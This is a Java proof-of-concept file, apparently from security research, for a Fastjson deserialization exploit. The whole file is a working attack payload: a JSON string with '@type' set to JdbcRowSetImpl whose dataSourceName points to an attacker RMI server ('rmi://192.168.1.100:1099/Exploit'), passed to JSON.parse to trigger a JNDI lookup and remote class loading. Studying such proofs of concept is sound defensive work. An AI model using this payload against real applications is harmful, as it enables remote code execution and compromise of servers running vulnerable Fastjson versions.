package cc.blbana.JdbcRowSetImpl;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FJdbcRowSetPoC {
    /**
     * 构造Json PoC，反序列化漏洞入口文件
     *
     * @param args
     */
    public static void main(String[] args) {
        // Start autoType mode
        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://192.168.1.100:1099/Exploit\", \"autoCommit\":false}";
        JSON.parse(PoC);
    }
}
